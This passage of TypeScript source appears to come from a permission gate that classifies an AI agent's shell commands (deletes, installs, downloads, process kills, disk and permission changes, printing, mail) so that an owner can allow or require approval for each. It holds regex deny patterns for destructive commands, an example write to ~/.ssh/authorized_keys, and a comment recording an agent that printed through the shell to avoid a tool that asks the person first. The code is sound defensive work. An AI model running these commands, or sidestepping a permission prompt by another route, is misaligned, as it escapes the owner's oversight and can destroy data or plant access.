  'add',
  'a',
  'ci',
  'clean-install',
  'ic',
  'install-clean',
  'isntall-clean',
  'install-test',
  'it',
  'install-ci-test',
  'cit',
  'uninstall',
  'remove',
  'rm',
  'r',
  'un',
  'update',
  'udpate',
  'up',
  'upgrade',
  'upgrade-interactive',
  'link',
  'ln',
  'unlink',
  'prune',
  'dedupe',
  'ddp',
  'rebuild',
  'rb',
  'global add',
  'global remove',
  'global upgrade',
  'self-update',
  'set version',
  'policies set-version',
  'plugin import',
  'pm trust',
  'env use',
  'env add',
  'env remove',
];

/**
 * The language, project and runtime managers, with every command of each that
 * installs, updates or removes (Codex, PR #710 passes 9 to 11, read against
 * each tool's own command reference): a package of a project or a global one,
 * the manager ITSELF (`brew update`, `port selfupdate`, `scoop update`,
 * `pnpm self-update`, Yarn 1's `policies set-version`, `uv self update`,
 * `nix upgrade-nix`, `pkg bootstrap`, `rustup self update`, `composer
 * self-update`), a runtime (`pnpm env use`, `uv python upgrade`, rustup's
 * toolchains, nvm, fnm, volta, pyenv, rbenv, asdf, mise, sdkman), and a
 * dependency added to or synced into a project (`go get`, `cargo add`, `uv
 * sync`, `bundle`, `dotnet restore`), as `npm add` and `npm ci` already were.
 * Building or running, which may fetch what a lockfile names (`cargo build`,
 * `uv run`, `dotnet build`), does not; nor does a refresh of the package lists
 * alone (`apt-get update`, `pkg update`).
 */
const CROSS_PLATFORM_INSTALLERS: Record<string, Installer> = {
  'npm|pnpm|bun': { verbs: NODE_VERBS },
  // `yarn` alone installs the project's dependencies.
  yarn: { verbs: NODE_VERBS, bare: 'options' },
  'pip|pip3': { verbs: ['install', 'uninstall'] },
  pipx: {
    verbs: [
      'install',
      'install-all',
      'uninstall',
      'uninstall-all',
      'upgrade',
      'upgrade-all',
      'reinstall',
      'reinstall-all',
      'inject',
      'uninject',
      'upgrade-shared',
    ],
  },
  // uv (review of PR #476)
  uv: {
    verbs: [
      'pip install',
      'pip uninstall',
      'pip sync',
      'add',
      'remove',
      'tool install',
      'tool uninstall',
      'tool upgrade',
      'python install',
      'python uninstall',
      'self update',
      'python upgrade',
      'sync',
    ],
  },
  go: { verbs: ['install', 'get', 'mod tidy'] },
  gem: { verbs: ['install', 'i', 'uninstall', 'update', 'cleanup', 'pristine'] },
  // Bundler: `bundle` alone is `bundle install`.
  'bundle|bundler': { verbs: ['install', 'update', 'add', 'remove', 'clean'], bare: 'options' },
  cargo: { verbs: ['install', 'uninstall', 'add', 'remove', 'update', 'binstall'] },
  rustup: {
    verbs: [
      'update',
      'install',
      'uninstall',
      'toolchain install',
      'toolchain uninstall',
      'toolchain link',
      'component add',
      'component remove',
      'target add',
      'target remove',
      'default',
      'override set',
      'self update',
      'self uninstall',
    ],
  },
  'conda|mamba|micromamba': {
    verbs: [
      'install',
      'remove',
      'uninstall',
      'update',
      'upgrade',
      'create',
      'env create',
      'env update',
      'env remove',
      'self-update',
    ],
  },
  // Composer runs on Symfony Console: any unambiguous start of a command is
  // that command (`composer req x`).
  composer: {
    verbs: [
      'install',
      'i',
      'update',
      'u',
      'upgrade',
      'require',
      'r',
      'remove',
      'rm',
      'uninstall',
      'reinstall',
      'self-update',
      'selfupdate',
      'create-project',
    ],
    abbreviations: true,
  },
  poetry: {
    verbs: [
      'install',
      'add',
      'remove',
      'update',
      'sync',
      'self update',
      'self add',
      'self remove',
      'self install',
      'python install',
      'python remove',
    ],
  },
  pdm: {
    verbs: [
      'install',
      'add',
      'remove',
      'update',
      'sync',
      'self update',
      'self add',
      'self remove',
      'python install',
      'py install',
      'python remove',
      'py remove',
    ],
  },
  pipenv: { verbs: ['install', 'uninstall', 'update', 'upgrade', 'sync', 'clean'] },
  dotnet: {
    verbs: [
      'tool install',
      'tool update',
      'tool uninstall',
      'tool restore',
      'add package',
      'remove package',
      // .NET 10's noun-first forms (Nodal Reviewer A, PR #710 pass 12).
      'package add',
      'package remove',
      'package update',
      'workload install',
      'workload update',
      'workload uninstall',
      'workload repair',
      'workload restore',
      'new install',
      'new uninstall',
      'restore',
    ],
  },
  nuget: { verbs: ['install', 'update', 'restore'] },
  deno: { verbs: ['install', 'i', 'uninstall', 'upgrade', 'add', 'remove'] },
  // Runtime version managers: what they install is a language's runtime.
  nvm: { verbs: ['install', 'uninstall', 'reinstall-packages', 'install-latest-npm'] },
  fnm: { verbs: ['install', 'uninstall'] },
  volta: { verbs: ['install', 'uninstall', 'setup'] },
  'pyenv|rbenv|nodenv': { verbs: ['install', 'uninstall', 'update'] },
  asdf: {
    verbs: ['install', 'uninstall', 'plugin add', 'plugin remove', 'plugin update', 'update'],
  },
  mise: {
    verbs: [
      'install',
      'i',
      'uninstall',
      'use',
      'u',
      'upgrade',
      'up',
      'self-update',
      'plugins install',
      'plugins uninstall',
      'plugins update',
    ],
  },
  sdk: { verbs: ['install', 'i', 'uninstall', 'rm', 'upgrade', 'ug', 'selfupdate'] },
  // ComfyUI's CLI: ComfyUI itself and its custom nodes
  comfy: {
    verbs: [
      'install',
      'update',
      'node install',
      'node uninstall',
      'node reinstall',
      'node update',
      'node install-deps',
    ],
  },
};

/** Every installer, by program name (the unit's: lower-cased, without `.exe`). */
const INSTALLERS: ReadonlyMap<string, Installer> = new Map(
  [WINDOWS_INSTALLERS, MACOS_INSTALLERS, LINUX_INSTALLERS, CROSS_PLATFORM_INSTALLERS].flatMap(
    (table) =>
      Object.entries(table).flatMap(([names, installer]) =>
        names.split('|').map((name): [string, Installer] => [name, installer]),
      ),
  ),
);

/** The programs `installsSoftware` reads, for the tests that keep one case per program. */
export const INSTALLER_PROGRAMS: readonly string[] = [...INSTALLERS.keys()];

/**
 * A package file run as a program (`x.msi`, `start x.msu`, `Start-Process
 * app.msix`): Windows hands it to its installer. macOS `.pkg` and Linux
 * `.deb` / `.rpm` / `.flatpakref` opened the same way go to theirs.
 */
const PACKAGE_FILE =
  /\.(?:msi|msp|msu|msix|msixbundle|appx|appxbundle|appinstaller|pkg|mpkg|deb|rpm|flatpakref)$/i;

/** One installer's words, read as its syntax writes them. */
interface InstallerWords {
  /** Option names, lower-cased (`--install` → `install`, `/Enable-Feature:x` → `enable-feature`). */
  names: Set<string>;
  /** GNU groups of short options, without their dash (`-Uvh` → `Uvh`). */
  groups: string[];
  /** The words that are not options. */
  operands: string[];
}

function installerWords(args: readonly string[], syntax: Installer['syntax']): InstallerWords {
  const words: InstallerWords = { names: new Set(), groups: [], operands: [] };
  const name = (w: string, lead: RegExp, sep: string) =>
    words.names.add((w.replace(lead, '').split(sep)[0] ?? '').toLowerCase());
  let optionsEnded = false;
  for (const w of args) {
    if (optionsEnded) words.operands.push(w);
    else if (syntax === 'windows' && /^[/-]./.test(w)) name(w, /^[/-]/, ':');
    else if (syntax === 'single-dash' && /^-./.test(w)) name(w, /^-+/, '=');
    else if (w === '--') optionsEnded = true;
    else if (/^--./.test(w)) name(w, /^--/, '=');
    else if (/^-[A-Za-z]+$/.test(w)) words.groups.push(w.slice(1));
    else if (!w.startsWith('-')) words.operands.push(w);
  }
  return words;
}

/**
 * `verb` anywhere in the unit, its words in order (`dnf module -y install x`).
 * Reaching it past the program's options would take each one's grammar (`nix
 * --option sandbox false profile install x`: a two-value option), so where it
 * stands is not read: a read that names a verb word asks (`zypper search patch`).
 */
function hasVerb(args: readonly string[], verbs: readonly string[]): boolean {
  const words = args.map((w) => w.toLowerCase());
  return verbs.some((verb) => {
    let from = 0;
    return verb.split(' ').every((part) => (from = words.indexOf(part, from) + 1) > 0);
  });
}

/**
 * True when the words name a command: their first word is not an option.
 * Past an option, a word may be its value, or one of several (`yarn --cwd
 * /srv/app`, `bundle --without development test` install; Nodal Reviewer A,
 * PR #710 passes 12 and 13): how many words an option takes is its grammar,
 * not read here, so a command written after an option asks (`yarn --silent
 * build`). The common reads name their command first (`yarn build`, `bundle
 * exec rspec`).
 */
function namesACommand(args: readonly string[]): boolean {
  const first = args[0];
  return first !== undefined && !first.startsWith('-');
}

/** True when one command unit installs, updates or removes software (#693). */
function installsSoftware(unit: readonly string[]): boolean {
  const program = unit[0] ?? '';
  const args = unit.slice(1);
  if (PACKAGE_FILE.test(program)) return true;
  // A versioned name is the same program (`pip3.12`, `gem3.2`).
  const installer = INSTALLERS.get(program) ?? INSTALLERS.get(program.replace(/[\d.]+$/, ''));
  if (installer === undefined) return false;
  // A word the text does not hold could be an install verb: it asks.
  if (args.some((w) => isDecidedAtRunTime(w) || isSplat(w))) return true;
  const words = installerWords(args, installer.syntax ?? 'gnu');
  const option = (o: string) =>
    o.endsWith('*')
      ? [...words.names.keys()].some((n) => n.startsWith(o.slice(0, -1)))
      : words.names.has(o);
  const verbs = installer.verbs ?? [];
  const onlyInforms =
    ['version', 'help'].some((n) => words.names.has(n)) ||
    words.groups.some((g) => /[vVh]/.test(g));
  return (
    installer.always === true ||
    (installer.bare === 'options' && !namesACommand(args) && !onlyInforms) ||
    (installer.bare === 'alone' && args.length === 0) ||
    (installer.abbreviations === true &&
      words.operands.some((w) => {
        const start = w.toLowerCase();
        return start.length >= 3 && verbs.some((v) => !v.includes(' ') && v.startsWith(start));
      })) ||
    (installer.operands === true && words.operands.length > 0) ||
    hasVerb(args, verbs) ||
    (installer.options ?? []).some(option) ||
    [...(installer.letters ?? '')].some((letter) => words.groups.some((g) => g.includes(letter)))
  );
}

/**
 * The same patterns, sorted by what a person would call them (#464). The
 * autonomy checklist lets an owner allow, ask or forbid each KIND of action;
 * their union below, with the installers `installsSoftware` reads, is still
 * exactly what `destructive_gate` gates.
 */
export const STATIC_SHELL_CATEGORY_PATTERNS = {
  delete_files: [
    // every program that deletes files (`DELETE_PROGRAMS`, the floor's list
    // too), and the cmdlets that erase an item's content or an entry
    new RegExp(
      String.raw`\b(?:${[...DELETE_PROGRAMS, ...Object.keys(PROVIDER_ERASERS)].join('|')})(?=\s|$)`,
      'i',
    ),
    /\bfind\b[^\n]*-delete\b/i, // find … -delete
    // rsync deleting what the source does not have, or the source itself
    /\brsync\b[^\n]*\s--(?:delete(?:-[a-z]+)*|del|remove-source-files)(?![\w-])/i,
    // destructive VCS: work thrown away
    subcommand('git', String.raw`push\b[^\n]*(?:--force|-f\b)`),
    subcommand('git', String.raw`reset\s+--hard\b`),
    subcommand('git', String.raw`clean\s+-\S*f`),
    subcommand('git', String.raw`branch\s+-D\b`),
  ],
  install_software: [
    // The installers of every OS are read by `installsSoftware` (#693), not
    // here. `uvx` runs a package's program, whose words are not read: an
    // install word in its line still asks (`uvx --from comfy-cli comfy install`).
    /\buvx\b[^\n]*\b(?:un)?install\b/i,
    // VS Code family: adding, updating or removing an extension (review of PR #682, pass 8)
    /\b(code|code-insiders|codium|vscodium|cursor|windsurf)\b[^\n]*--(?:install-extension|uninstall-extension|update-extensions)\b/i,
  ],
  // A command is filed by what it DOES (#581): fetching files (a model, an
  // archive, an image) is a download, whatever tool fetches it; installing
  // software is the kind above. `comfy model download` and `pip download` sat
  // in install_software, so an owner who let an agent fetch models without
  // asking had to let it install software.
  download: [
    // `iwr` is Invoke-WebRequest's alias (review of PR #476). `curl` is not
    // here: it downloads only when it writes a file (`-o`, `-O`, `--output`,
    // `-sLoC:\x`), read by `curlWritesAFile` with the same reader as its
    // targets, which a pattern cannot do (`-XPOST` swallows its group).
    /\bwget\b|\bInvoke-WebRequest\b|\biwr\b|\bStart-BitsTransfer\b|\baria2c\b/i, // large download
    subcommand('git', String.raw`clone\b`), // clone
    // `download` / `pull` must END the word: `comfy model download-status`,
    // `downloads` and `download-cancel` only read or stop one, and `\b` alone
    // let `download-status` match (run ca5753a8 asked the owner before every
    // progress check, #552).
    /\bcomfy\b[^\n]*\bmodel\s+download(?![\w-])|\bpip3?\b[^\n]*\bdownload(?![\w-])/i, // model / package files
    subcommand('hf|huggingface-cli', String.raw`download(?![\w-])`), // Hugging Face files
    subcommand('ollama', String.raw`pull(?![\w-])`), // models
    subcommand('git', String.raw`lfs\s+(?:pull|fetch)(?![\w-])`), // LFS objects
    // images: `docker pull`, `docker image pull`, `docker compose -f x pull`,
    // and the standalone compose binaries (`docker-compose pull`)
    subcommand(
      'docker-compose|podman-compose|docker|podman',
      String.raw`(?:(?:image|compose)${GLOBAL_OPTIONS}\s+)?pull(?![\w-])`,
    ),
  ],
  stop_programs: [
    /\b(kill|pkill|killall|taskkill)\b|\bStop-Process\b|\bStop-Service\b/i, // process kill
    /\bsystemctl\b|\bsc\s+(stop|delete)\b|\bservice\b[^\n]*\b(stop|restart)\b|\bnet\s+stop\b/i, // service control
  ],
  system_settings: [
    /\bmkfs(\.\w+)?\b|\bdd\b[^\n]*\bof=|\b(format|fdisk|parted|diskpart)\b/i, // disk ops
    /\b(chmod|chown|chgrp|takeown|icacls)\b|\bSet-Acl\b|\breg\s+(add|delete|import)\b/i, // permissions, ownership, registry
  ],
} as const satisfies Record<string, readonly RegExp[]>;

/**
 * The kinds of action read from a command's text: the patterns above, plus
 * inline code (`python -c "…"`), whose program is text nobody can read ahead,
 * and what reaches past the computer's files (`reachesOut`).
 */
export type StaticShellCategory =
  | keyof typeof STATIC_SHELL_CATEGORY_PATTERNS
  | 'inline_code'
  | 'open_or_send';

// ── What reaches past the computer's files (#667) ────────────────────────────
// 01/10: asked to print, an agent holding a print tool that asks the person
// first ran `Start-Process … -Verb Print` through the shell instead, and no
// kind of action covered it. The rule: a command reaches out when the program
// it runs hands something to the person's desktop (a window, a file opened in
// its program, a notification), to a device (a printer), or to someone (mail).
// Read from the program and its words, like every kind here: a script, inline
// code or a .NET/COM call that does the same is not seen (#628, a sandbox).

/** They exist to hand a file, an address or a message to the desktop or a device. */
const OUTWARD_PROGRAMS = new Set([
  // the OS's "open this" (macOS, Linux desktops, WSL, Windows)
  'open',
  'xdg-open',
  'xdg-email',
  'gnome-open',
  'kde-open',
  'kde-open5',
  'wslview',
  'sensible-browser',
  'x-www-browser',
  'invoke-item',
  'ii',
  'explorer',
  'rundll32',
  'osascript',
  'notify-send',
  // printers
  'lp',
  'lpr',
  'out-printer',
  'print',
  // mail
  'sendmail',
  'send-mailmessage',
  'msmtp',
  'ssmtp',
  'swaks',
  'mail',
  'mailx',
  'mutt',
]);

/** `program subcommand` launchers: `gio open`, `kioclient exec`. */
const OUTWARD_SUBCOMMANDS: Record<string, ReadonlySet<string>> = {
  gio: new Set(['open', 'launch']),
  kioclient: new Set(['exec']),
  kioclient5: new Set(['exec']),
};

/**
 * The flags that keep a desktop program windowless (its command-line uses).
 * `x*` is a prefix, `x=` also matches `x=value`, `a b` is two words.
 */
const VSCODE_CLI = [
  '--version',
  '-v',
  '--help',
  '-h',
  '--install-extension',
  '--uninstall-extension',
  '--list-extensions',
  '--update-extensions',
  '--locate-shell-integration-path',
  'tunnel',
  'serve-web',
];
const BROWSER_CLI = ['--headless*'];
const LIBREOFFICE_CLI = ['--headless*', '--convert-to', '--print-to-file', '--cat'];

/**
 * Desktop programs of Windows, macOS and Linux: editors, viewers, office
 * suites, browsers, mail clients, file managers, terminals (#667, #686). Run,
 * they open a window on the person's screen, unless one of their command-line
 * flags keeps them windowless. A desktop program not here is not seen: the
 * OS launchers (`start`, `open`, `xdg-open`) are, whatever they open.
 */
const DESKTOP_PROGRAMS: ReadonlyMap<string, readonly string[]> = new Map<string, readonly string[]>(
  [
    // editors
    ...['code', 'code-insiders', 'codium', 'vscodium', 'cursor', 'windsurf'].map(
      (p) => [p, VSCODE_CLI] as const,
    ),
    ...[
      'zed',
      'subl',
      'sublime_text',
      'atom',
      'notepad',
      'notepad++',
      'wordpad',
      'write',
      'gedit',
      'gnome-text-editor',
      'kate',
      'kwrite',
      'mousepad',
      'pluma',
      'xed',
      'leafpad',
      'featherpad',
      'gvim',
      'mvim',
      'macvim',
      'bbedit',
      'mate',
    ].map((p) => [p, []] as const),
    ['emacs', ['--batch', '-batch', '--script', '-nw', '--no-window-system']],
    // viewers, images, media
    ...[
      'mspaint',
      'evince',
      'okular',
      'eog',
      'eom',
      'feh',
      'gwenview',
      'xreader',
      'atril',
      'zathura',
      'mupdf',
      'xpdf',
      'sumatrapdf',
      'acrord32',
      'acrobat',
      'foxitreader',
      'foxitpdfreader',
      'qpdfview',
      'ristretto',
      'shotwell',
      'gthumb',
      'totem',
      'celluloid',
      'wmplayer',
      'mpv',
    ].map((p) => [p, []] as const),
    ['gimp', ['-i', '--no-interface']],
    ['inkscape', ['--export-*', '--query-*', '-o']],
    ['krita', ['--export', '--export-filename', '--export-pdf']],
    ['vlc', ['-I dummy', '--intf=dummy']],
    // office
    ...['winword', 'excel', 'powerpnt', 'onenote', 'msaccess', 'mspub', 'visio', 'gnumeric'].map(
      (p) => [p, []] as const,
    ),
    ...['soffice', 'libreoffice', 'lowriter', 'localc', 'loimpress'].map(
      (p) => [p, LIBREOFFICE_CLI] as const,
    ),
    ['abiword', ['--to=', '-t']],
    // browsers
    ...[
      'msedge',
      'chrome',
      'google-chrome',
      'google-chrome-stable',
      'chromium',
      'chromium-browser',
      'firefox',
      'librewolf',
      'brave',
      'brave-browser',
      'opera',
      'vivaldi',
      'iexplore',
      'epiphany',
      'falkon',
      'konqueror',
      'midori',
    ].map((p) => [p, BROWSER_CLI] as const),
    // mail, file managers, terminals, small tools
    ...[
      'thunderbird',
      'outlook',
      'evolution',
      'kmail',
      'geary',
      'nautilus',
      'dolphin',
      'thunar',
      'nemo',
      'pcmanfm',
      'caja',
      'krusader',
      'gnome-terminal',
      'konsole',
      'xterm',
      'xfce4-terminal',
      'terminator',
      'alacritty',
      'kitty',
      'wezterm',
      'tilix',
      'wt',
      'calc',
      'gnome-calculator',
      'kcalc',
    ].map((p) => [p, []] as const),
  ],
);

/** A desktop program's print flags (`notepad /p`, `AcroRd32 /t`, `soffice -p`): they print, window or not. */
const PRINT_FLAGS = new Set(['/p', '/pt', '/t', '-p', '-pt', '--pt']);

/** True when one of `flags` (a desktop program's command-line uses) is among `args`. */
function keepsWindowless(args: readonly string[], flags: readonly string[]): boolean {
  const lower = args.map((a) => a.toLowerCase());
  return flags.some((flag) => {
    const f = flag.toLowerCase();
    if (f.includes(' ')) {
      const [first, second] = f.split(' ');
      return lower.some((a, i) => a === first && lower[i + 1] === second);
    }
    if (f.endsWith('*')) return lower.some((a) => a.startsWith(f.slice(0, -1)));
    if (f.endsWith('=')) return lower.some((a) => a.startsWith(f) || a === f.slice(0, -1));
    return lower.some((a) => a === f || a.startsWith(`${f}=`));
  });
}

/** Files a desktop hands to their program when they are run or launched. */
const DOCUMENT =
  /\.(txt|md|log|csv|pdf|rtf|docx?|xlsx?|pptx?|od[tsp]|html?|xml|json|png|jpe?g|gif|bmp|svg|webp|tiff?|mp[34]|wav|mov|avi|url|lnk)$/i;

/** A file the desktop opens in its program, or an address it opens in a browser or mail client. */
function isDocumentOrAddress(word: string): boolean {
  return /^[a-z][\w+.-]*:\/\//i.test(word) || /^mailto:/i.test(word) || DOCUMENT.test(word);
}

/** cmd's `start`, and PowerShell's `Start-Process` with its aliases. */
const LAUNCHERS = new Set(['start', 'start-process', 'saps']);

/** What a launcher was asked to start, and how (#667). */
interface Launch {
  /** The program, file or address it starts; null when the text does not say. */
  target: string | null;
  /** The words given to what it starts (`-ArgumentList`, or what follows the target). */
  launched: string[];
  /** A shell verb: `-Verb Print`, `-Verb Open`, `-Verb RunAs`… */
  verb: boolean;
  /** No window: `start /b`, `-NoNewWindow`, `-WindowStyle Hidden`. */
  windowless: boolean;
  /** Where cmd's window title stands among the words, when there is one. */
  titleIndex: number | null;
}

/**
 * Which form a launcher's words take: cmd's `start` (switches `/x`, a window
 * title, then the program and ITS words), or PowerShell's `Start-Process`
 * (named parameters anywhere; `start` and `saps` are its aliases there, and
 * `wordUnits` names `start` `start-process` in a PowerShell line).
 */
type LaunchForm = 'cmd' | 'powershell';

/**
 * THE reading of `start` / `Start-Process`, left to right (review of PR #682,
 * pass 7). cmd: switches with their values (spaced, glued or quoted), the
 * window title (the first quoted argument that is not a switch's value, when
 * `readTitle`), then what it starts and its own words, untouched. PowerShell:
 * its named parameters, then the positional file and argument list. The
 * title, what it starts and how are all read from here, nowhere else.
 */
function readLaunch(words: readonly ShellWord[], form: LaunchForm, readTitle = false): Launch {
  const args = words.map((w) => w.text);
  const launch: Launch = {
    target: null,
    launched: [],
    verb: false,
    windowless: false,
    titleIndex: null,
  };
  if (form === 'powershell') {
    // Start-Process's parameters as PowerShell binds them (#694): `-n` is
    // -NoNewWindow, `-Path` -FilePath, `–Verb` a verb. A switch counts only
    // when it is surely set (`-NoNewWindow:$false` keeps the window).
    for (const b of bindPsArguments(args, START_PROCESS)) {
      const is = (name: string): boolean => b.names?.includes(name) === true;
      const value = b.value ?? '';
      if (b.names === null) {
        if (launch.target === null) launch.target = value;
        else launch.launched.push(...value.split(/[\s,]+/));
        continue;
      }
      if (is('verb')) launch.verb = true;
      if (is('nonewwindow') && psSwitch([b], 'nonewwindow') === true) launch.windowless = true;
      if (is('windowstyle') && value.toLowerCase() === 'hidden') launch.windowless = true;
      if (is('filepath')) launch.target = value;
      if (is('argumentlist')) launch.launched.push(...value.split(/[\s,]+/));
    }
    launch.launched = launch.launched.filter((w) => w !== '');
    return launch;
  }
  for (let i = 0; i < args.length; i++) {
    const word = args[i] ?? '';
    if (launch.target !== null) {
      launch.launched.push(word);
    } else if (readTitle && launch.titleIndex === null && words[i]?.quoted) {
      launch.titleIndex = i;
    } else if (/^\/(d|node|affinity|machine)$/i.test(word)) {
      // `/D path`, `/NODE n`, `/AFFINITY hex`, `/MACHINE x` take a value (pass 6).
      i += 1;
    } else if (/^\/d\S/i.test(word) || /^\/\w+$/.test(word)) {
      if (word.toLowerCase() === '/b') launch.windowless = true;
    } else launch.target = word;
  }
  launch.launched = launch.launched.filter((w) => w !== '');
  return launch;
}

/** The form of a launcher unit's words: `start` is cmd's, the others PowerShell's. */
const launchForm = (program: string): LaunchForm => (program === 'start' ? 'cmd' : 'powershell');

/**
 * cmd's `start` and PowerShell's `Start-Process` hand what they start to the
 * desktop: a shell verb (`-Verb Print`) is a desktop action, and so is a
 * window, and so is a file or an address (opened in its program). Without
 * any (`start /b node server.js`, `-WindowStyle Hidden`), they start a program
 * in the background, the dev server idiom on Windows; what that program does
 * is read as its own command (`commandUnits`).
 */
function launchReachesOut(program: string, args: readonly string[]): boolean {
  // The unit has no title left: `wordUnits` took it out with this same reading.
  const words = args.map((text) => ({ text, quoted: false }));
  const { target, verb, windowless } = readLaunch(words, launchForm(program));
  return verb || !windowless || (target !== null && isDocumentOrAddress(target));
}

/**
 * A program that opens its window or its file whatever it is asked: a desktop
 * program not told to stay windowless, or a document run by name. `notepad
 * --help` opens Notepad: the help/version excuse ("it prints and exits") is
 * not theirs (#691, review of PR #682, pass 8).
 */
function opensWhateverAsked(unit: readonly string[]): boolean {
  const program = unit[0] ?? '';
  const windowless = DESKTOP_PROGRAMS.get(program);
  return (
    isDocumentOrAddress(program) ||
    (windowless !== undefined && !keepsWindowless(unit.slice(1), windowless))
  );
}

/** True when one command unit hands something to the desktop, a device or someone (#667). */
function reachesOut(unit: readonly string[]): boolean {
  const program = unit[0] ?? '';
  const args = unit.slice(1);
  if (OUTWARD_PROGRAMS.has(program)) return true;
  if (OUTWARD_SUBCOMMANDS[program]?.has((args[0] ?? '').toLowerCase())) return true;
  if (LAUNCHERS.has(program)) return launchReachesOut(program, args);
  const windowless = DESKTOP_PROGRAMS.get(program);
  if (windowless !== undefined) {
    return args.some((a) => PRINT_FLAGS.has(a.toLowerCase())) || !keepsWindowless(args, windowless);
  }
  // `.\report.txt`, `cmd /c report.pdf`: a document run by name opens in its program.
  return isDocumentOrAddress(program);
}

const DESTRUCTIVE_PATTERNS: RegExp[] = Object.values(STATIC_SHELL_CATEGORY_PATTERNS).flat();

/**
 * The kinds of action a command performs, read from its text alone (#464).
 * Inline code (`python -c "…"`, `node -e "…"`) is its own kind: what it does is
 * not read, it is asked about, as `destructive_gate` always did.
 */
export function staticShellCategories(
  command: string,
  host?: ShellHost,
  /** The shell a script's line is written for, over the host's (#635). */
  reader?: ScriptShell,
): StaticShellCategory[] {
  if (typeof command !== 'string' || command.trim() === '') return [];
  const cmd = command;
  const shell = reader ?? topShell(host);
  // Read from the PROGRAMS the command runs, never from any word of its text
  // (review of PR #474, Reviewer A, P1): `git commit -m "rm old refs"` does not
  // delete, and `clang-format` is not `format`. A pattern counts only where it
  // matches at the start of a command the shell will run — each segment, and
  // the commands wrapped in `bash -c`, `cmd /c`, `powershell -Command`,
  // `xargs`, `find -exec` and `$(…)`. Hermes Agent anchors its patterns the
  // same way. Quotes and carets are removed by the tokenizer, so `r""m` and
  // `r^m` still read as `rm`.
  const found = new Set<StaticShellCategory>();
  for (const unit of commandUnits(cmd, 0, shell)) {
    for (const category of unitCategories(unit)) found.add(category);
    if (downloadsToItsOutput(unit)) found.add('download');
  }
  if (isInlineInterpreterEvalCommand(cmd, host, reader)) found.add('inline_code');
  return [...found];
}

/**
 * Where a download line writes, read from its text (#614, revue Nodal de la PR
 * #618, P1b). A download runs without asking because it lands in the agent's
 * workspace; `curl -o ~/.ssh/authorized_keys` or `git clone URL D:\elsewhere`
 * does not. The runner resolves these against the command's working folder
 * and the job's workspaces (packages/tools, shell-checklist.ts).
 *
 * - `dirs`: the folders the line moves into (`cd`, `pushd`, `Push-Location`,
 *   `Set-Location`), in order, `null` when unreadable (`cd` alone, `cd -`,
 *   `popd`, a variable); a move made in a child process is undone where it
 *   ends, and a script run in the line's process leaves it where it ends
 *   (`FolderMove`, #717).
 * - `targets`: each place a fetcher writes, as written (`'.'` for the working
 *   folder: `curl -O`, `wget URL`, `git clone URL`), or `null` when the text
 *   does not say where (a variable, `~`, a sub-shell): that asks, invariant #4.
 *   `after` is how many of `dirs` come before it in the line: the target is
 *   judged from the folder the line is in at that point (revue passe 2). A
 *   shell redirection (`> file`) is read with its command, and judged from
 *   where that command stands (pass 8); null: from every folder of the line.
 *   A program that writes into its own store (`docker pull`, `ollama pull`,
 *   `comfy model download`, `hf download` without `--local-dir`) names no path
 *   and adds none.
 */
export interface DownloadTarget {
  path: string | null;
  after: number | null;
  /**
   * The same write as another reading of the line hands it on
   * (`downloadWrites`): judged too, and named by `path`, the first reading.
   */
  also?: DownloadTarget[];
}

export interface DownloadWrites {
  /** How the line moves its folder, in order (`lineFolders`). */
  dirs: FolderMove[];
  targets: DownloadTarget[];
}

/**
 * The kind of shell a command is judged for. The null sink is the host's own
 * (`isNullSink`): `NUL` is a device only where Windows resolves it, and on any
 * other host `curl -o nul` writes a real file named `nul` (#669).
 */
export type ShellHost = 'windows' | 'posix';

export function downloadWrites(
  command: string,
  host: ShellHost,
  reader?: ScriptShell,
): DownloadWrites {
  const out: DownloadWrites = { dirs: [], targets: [] };
  if (typeof command !== 'string' || command.trim() === '') return out;
  const cmd = command;
  // Each target is judged from the folders before it (`dirs`, `after`), so a
  // line is read in order, by one grammar at a time. Two readings: the one
  // the place analysis always made, PowerShell's, which ends a command at
  // `;`, `&` and `|` and keeps a backslash a folder separator (#669), and the
  // one of the shell that runs the line, the script's (`reader`) or the
  // host's, as it hands each word on (Nodal review of PR #721, pass 7): sh
  // takes a backslash out, `.\./x` is `../x`. Where they differ, both are
  // judged, each from where the line starts (`{ save }`, `{ restore }`): a
  // place outside in either asks, a safety net never reads fewer than it did.
  // A write the readings both find (the same count of them) is one target,
  // named as the first reads it, the other reading's place in `also`. Two
  // readings are alike only when all they report is (pass 8): one that alone
  // sees a download (`i\wr` in sh) is never dropped.
  const shell: LineShell = reader ?? (host === 'windows' ? 'cmd' : 'sh');
  const readings: DownloadWrites[] = [];
  for (const grammar of new Set<LineShell>(['powershell', shell])) {
    const read = readWrites(cmd, host, grammar, shell, reader === 'cmd');
    if (!readings.some((r) => JSON.stringify(r) === JSON.stringify(read))) readings.push(read);
  }
  let first = 0;
  readings.forEach((read, n) => {
    if (n > 0) out.dirs.push({ restore: true });
    if (n < readings.length - 1) out.dirs.push({ save: true });
    const offset = out.dirs.length;
    out.dirs.push(
      ...read.dirs.map((d) =>
        d !== null && typeof d === 'object' && 'unsure' in d ? { unsure: d.unsure + offset } : d,
      ),
    );
    const targets = read.targets.map((t) => ({
      path: t.path,
      after: t.after === null ? null : t.after + offset,
    }));
    // The first reading's writes, then each other one's: attached to them
    // when it finds as many, alongside otherwise.
    if (n === 0) first = targets.length;
    if (n === 0 || targets.length !== first) out.targets.push(...targets);
    else
      targets.forEach((t, k) => {
        const into = out.targets[k];
        if (into !== undefined) into.also = [...(into.also ?? []), t];
      });
  });
  return out;
}

/**
 * Where a line writes, read with `grammar` (one reading of `downloadWrites`);
 * which of its commands move the
 * folder is read for `shell`, the one whose process runs them (#717). On a
 * line that downloads, what its commands write besides: a pipe writer
 * (`iwr URL | Set-Content file`) and a redirection (`curl URL > file`), read
 * with the command by the same grammar (`UNIT_REDIRECTIONS`), from where it
 * stands in the line (Nodal review of PR #721, pass 8).
 */
function readWrites(
  cmd: string,
  host: ShellHost,
  grammar: LineShell,
  shell: LineShell,
  batch: boolean,
): DownloadWrites {
  const out: DownloadWrites = { dirs: [], targets: [] };
  let downloads = false;
  const besides: DownloadTarget[] = [];
  const opened = new Set<Redirection>();
  const write = (into: DownloadTarget[], t: string | null): void => {
    if (t === null || !isNullSink(t, host))
      into.push({ path: t === null ? null : readablePath(t), after: out.dirs.length });
  };
  const folders = lineFolders(batch);
  for (const unit of commandUnits(cmd, 0, grammar, shell)) {
    const program = unit[0] ?? '';
    const args = unit.slice(1);
    const { before, move } = folders.step(unit);
    out.dirs.push(...before);
    // What a command writes lands where it starts; a program the shell may
    // resolve to a script of the folder (`curl`) still writes (#717).
    for (const t of pipeWriterTargets(program, args)) write(besides, t);
    // Each redirection once, where the first command it covers stands: the
